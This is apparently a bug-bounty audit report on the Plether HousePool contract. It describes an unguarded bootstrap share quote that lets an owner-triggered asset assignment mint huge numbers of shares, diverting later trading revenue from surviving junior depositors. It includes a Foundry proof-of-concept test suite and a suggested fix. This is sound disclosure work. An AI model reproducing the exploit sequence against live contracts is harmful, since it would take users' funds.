# \#98290 [SC-Critical] HousePool.assignUnassignedAssets inverted bootstrap mint confiscates surviving juniors' later trading revenue

**Submitted on Nov 6th 2026 at 19:01:32 UTC by @delusionlabs for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98290
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  - Theft of unclaimed yield
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

When junior principal is wiped to 0 (or reduced to dust) while junior shares remain outstanding, subsequent trading revenue from closing trader losses legitimately accrues to surviving junior share holders. Under normal operation, surviving shares capture their pro-rata entitlement of incoming trading revenue.

If the owner calls HousePool.assignUnassignedAssets(false, receiver) on leftover recapitalization funds, TrancheVault.quoteBootstrapDeposit calculates new shares against zero total assets without checking for surviving share supply.

Ordinary deposits explicitly guard against this state:

solidity
// TrancheVault.estimateDepositShares
if (pricingAssets == 0 && pricingSupply != 0) {
    return 0;
}

HousePool settlement uses the exact same guard (juniorActivationDeferred = pricingAssets == 0 && pricingSupply != 0).

Bootstrap deposit skips this guard entirely:

solidity
function quoteBootstrapDeposit(uint256 assets) external view returns (uint256) {
    return _convertToSharesUsingAssets(assets, _depositPricingAssets(), Math.Rounding.Floor);
}
function _convertToSharesUsingAssets(...) internal view returns (uint256) {
    return Math.mulDiv(assets, accruedTotalSupply() + VIRTUAL_SHARES, totalAssets_ + 1, rounding);
}

At totalAssets_ == 0, the denominator is 1. The formula multiplies incoming assets by the entire surviving share supply: assets * (accruedTotalSupply() + 1000) / 1.

Assigning 8,000e6 leftover assets onto 101,000,913,208,338 existing shares mints 808,007,305,674,704,000,000,000 shares to the receiver, diluting original junior holders from 99.01% down to ~0.00000001%. When a trader subsequently closes a position generating 3,000e6 in revenue, the original depositor (Alice) receives 0, while the bootstrap receiver extracts 2,999.999999e6.

Distinctions to prevent false triage dismissals:

This is not reporting that leftover recap cash is stolen; that pot is ownerless by spec. The loss is the surviving holders' claim to later trading revenue.
This is not Cecuro (recap and revenue in the same pending pass parking revenue as unassigned). This PoC exercises a later, separate close. Without assign, that revenue reaches survivors.
The owner can safely assign leftover to senior without harming junior survivors; assigning it to wiped junior shares is the flaw.
Terminal wipe is not required; leaving dust principal (~1e6) still inverts the quote.

Suggested fix: Enforce the same check in quoteBootstrapDeposit as in estimateDepositShares (return 0 or revert), or require nominal 1:1 issuance for post-wipe bootstrap assignments.

## Link to Proof of Concept

https://gist.github.com/delusion-labs/0a43f7fc1429f5f0de687fcb0960a275

## Proof of Concept

Single file drop-in test suite for packages/perps at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8.

Drop-in path: packages/perps/test/perps/AssignLaterRevenue.t.sol

Reproduction command:
forge test --match-contract TrustedRoleYieldHarnessTest -vv

Test suite structure and observed results:
1. test_UnassignedRecapLeavesLaterRevenueWithSurvivors: PASS
   - Control baseline: Surviving junior LPs retain and receive their pro-rata share of subsequent trading revenue (2,970.297298e6 of 3,000e6) when recap leftover remains unassigned.
2. test_AssignAfterWipeStealsLaterTradingRevenueFromSurvivors: IMPACT
   - Vulnerability: Calling assignUnassignedAssets(false, receiver) at 0 principal mints inverted shares, redirecting subsequent revenue to the receiver (Alice gets 0, receiver extracts 2,999.999999e6).
3. test_WipedEstimateDepositIsZeroButBootstrapQuoteInverts: IMPACT
   - Shows estimateDepositShares returns 0 while quoteBootstrapDeposit mints orders of magnitude above total supply.
4. test_DustPrincipalAssignStillStealsLaterRevenue: IMPACT
   - Demonstrates the vector holds even with dust principal (~$1 remaining); total wipe is not strictly required.
5. test_AssignToSeniorDoesNotStealLaterJuniorRevenue: PASS
   - Control showing assigning surplus to senior tranche leaves junior survivors intact.

Source code:

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HarnessBase} from "./HarnessBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @notice File only if surviving juniors lose later trading revenue they still received without assign.
contract TrustedRoleYieldHarnessTest is HarnessBase {
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _openWipeRecap() internal returns (uint256 aliceShares, uint256 size) {
        _fundJunior(ALICE, 100_000e6);
        aliceShares = juniorVault.balanceOf(ALICE);
        _fundTrader(TRADER, 40_000e6);
        _open(TRADER, CfdTypes.Side.SHORT, 20_000e18, 10_000e6, 1e8);
        (size,,,,,,) = engine.positions(TRADER);

        _wipeJuniorViaBurn();
        uint256 recap = 8_000e6;
        settlementToken.mint(address(pool), recap);
        vm.prank(address(engine));
        pool.recordClaimantInflow(
            recap, IHousePool.ClaimantInflowKind.Recapitalization, IHousePool.ClaimantInflowCashMode.CashArrived
        );
        _reconcileJunior();
        require(pool.unassignedAssets() > 0, "recap leftover must be unassigned");
    }

    function test_UnassignedRecapLeavesLaterRevenueWithSurvivors() public {
        (uint256 aliceShares, uint256 size) = _openWipeRecap();
        uint256 supply = juniorVault.totalSupply();
        uint256 unassignedAfterRecap = pool.unassignedAssets();

        _close(TRADER, CfdTypes.Side.SHORT, size, 0.85e8);
        _reconcileJunior();

        uint256 juniorAfter = pool.juniorPrincipal();
        uint256 unassignedAfter = pool.unassignedAssets();
        if (juniorAfter < 50e6) {
            // Survivors did not keep a junior claim on later revenue. Assign is not stealing that claim.
            return;
        }
        uint256 aliceClaim = (juniorAfter * aliceShares) / juniorVault.totalSupply();
        uint256 fair = (juniorAfter * aliceShares) / supply;
        if (aliceClaim + 1e6 < fair) {
            revert(
                string.concat(
                    "IMPACT unassigned recap leftover prevented surviving juniors from receiving later revenue ",
                    vm.toString(aliceShares),
                    " ",
                    vm.toString(juniorVault.totalSupply()),
                    " ",
                    vm.toString(juniorAfter),
                    " ",
                    vm.toString(aliceClaim),
                    " ",
                    vm.toString(unassignedAfter),
                    " ",
                    vm.toString(unassignedAfterRecap)
                )
            );
        }
    }

    function test_AssignAfterWipeStealsLaterTradingRevenueFromSurvivors() public {
        (uint256 aliceShares, uint256 size) = _openWipeRecap();
        uint256 supplyBefore = juniorVault.totalSupply();

        pool.assignUnassignedAssets(false, ATTACKER);
        uint256 juniorAtAssign = pool.juniorPrincipal();
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);

        _close(TRADER, CfdTypes.Side.SHORT, size, 0.85e8);
        _reconcileJunior();

        uint256 juniorAfter = pool.juniorPrincipal();
        uint256 revenue = juniorAfter > juniorAtAssign ? juniorAfter - juniorAtAssign : 0;
        if (revenue < 50e6) {
            return;
        }
        uint256 supplyAfter = juniorVault.totalSupply();
        uint256 aliceRevenueClaim = (revenue * aliceShares) / supplyAfter;
        uint256 fairRevenueClaim = (revenue * aliceShares) / supplyBefore;
        uint256 attackerRevenueClaim = (revenue * attackerShares) / supplyAfter;

        if (aliceRevenueClaim * 10 < fairRevenueClaim && attackerRevenueClaim * 2 > revenue) {
            revert(
                string.concat(
                    "IMPACT documented assign after wipe gave later trading revenue to the bootstrap receiver instead of surviving juniors",
                    " revenue=",
                    vm.toString(revenue),
                    " aliceFair=",
                    vm.toString(fairRevenueClaim),
                    " aliceGot=",
                    vm.toString(aliceRevenueClaim),
                    " attackerGot=",
                    vm.toString(attackerRevenueClaim),
                    " supplyBefore=",
                    vm.toString(supplyBefore),
                    " supplyAfter=",
                    vm.toString(supplyAfter),
                    " aliceShares=",
                    vm.toString(aliceShares),
                    " attackerShares=",
                    vm.toString(attackerShares),
                    " juniorAtAssign=",
                    vm.toString(juniorAtAssign)
                )
            );
        }
    }

    function test_WipedEstimateDepositIsZeroButBootstrapQuoteInverts() public {
        _openWipeRecap();
        uint256 leftover = pool.unassignedAssets();
        uint256 estimated = juniorVault.estimateDepositShares(leftover);
        uint256 quoted = juniorVault.quoteBootstrapDeposit(leftover);
        if (estimated != 0) {
            return;
        }
        if (quoted > juniorVault.totalSupply()) {
            _failImpact("wiped junior: estimateDepositShares is 0 but quoteBootstrapDeposit mints more than surviving supply");
        }
    }

    function test_AssignToSeniorDoesNotStealLaterJuniorRevenue() public {
        (uint256 aliceShares, uint256 size) = _openWipeRecap();
        uint256 supplyBefore = juniorVault.totalSupply();
        try pool.assignUnassignedAssets(true, ATTACKER) {
            _close(TRADER, CfdTypes.Side.SHORT, size, 0.85e8);
            _reconcileJunior();
            uint256 juniorAfter = pool.juniorPrincipal();
            if (juniorAfter < 50e6) {
                return;
            }
            uint256 aliceClaim = (juniorAfter * aliceShares) / juniorVault.totalSupply();
            uint256 fair = (juniorAfter * aliceShares) / supplyBefore;
            if (aliceClaim + 1e6 < fair) {
                _failImpact("assign leftover to senior still diluted surviving juniors' later revenue");
            }
        } catch {}
    }

    function test_DustPrincipalAssignStillStealsLaterRevenue() public {
        _fundJunior(ALICE, 100_000e6);
        uint256 aliceShares = juniorVault.balanceOf(ALICE);
        uint256 supplyBefore = juniorVault.totalSupply();
        _fundTrader(TRADER, 40_000e6);
        _open(TRADER, CfdTypes.Side.SHORT, 20_000e18, 10_000e6, 1e8);
        (uint256 size,,,,,,) = engine.positions(TRADER);

        uint256 junior = pool.juniorPrincipal();
        require(junior > 2e6, "need room to leave dust");
        settlementToken.burn(address(pool), junior - 1e6);
        _reconcileJunior();
        require(pool.juniorPrincipal() > 0 && pool.juniorPrincipal() < 2e6, "dust principal");

        uint256 recap = 8_000e6;
        settlementToken.mint(address(pool), recap);
        vm.prank(address(engine));
        pool.recordClaimantInflow(
            recap, IHousePool.ClaimantInflowKind.Recapitalization, IHousePool.ClaimantInflowCashMode.CashArrived
        );
        _reconcileJunior();
        if (pool.unassignedAssets() == 0) {
            return;
        }

        pool.assignUnassignedAssets(false, ATTACKER);
        uint256 juniorAtAssign = pool.juniorPrincipal();
        uint256 attackerShares = juniorVault.balanceOf(ATTACKER);

        _close(TRADER, CfdTypes.Side.SHORT, size, 0.85e8);
        _reconcileJunior();
        uint256 juniorAfter = pool.juniorPrincipal();
        uint256 revenue = juniorAfter > juniorAtAssign ? juniorAfter - juniorAtAssign : 0;
        if (revenue < 50e6) {
            return;
        }
        uint256 aliceRevenueClaim = (revenue * aliceShares) / juniorVault.totalSupply();
        uint256 fairRevenueClaim = (revenue * aliceShares) / supplyBefore;
        uint256 attackerRevenueClaim = (revenue * attackerShares) / juniorVault.totalSupply();
        if (aliceRevenueClaim * 10 < fairRevenueClaim && attackerRevenueClaim * 2 > revenue) {
            _failImpact("dust junior principal assign still gave later trading revenue to the bootstrap receiver");
        }
    }
}

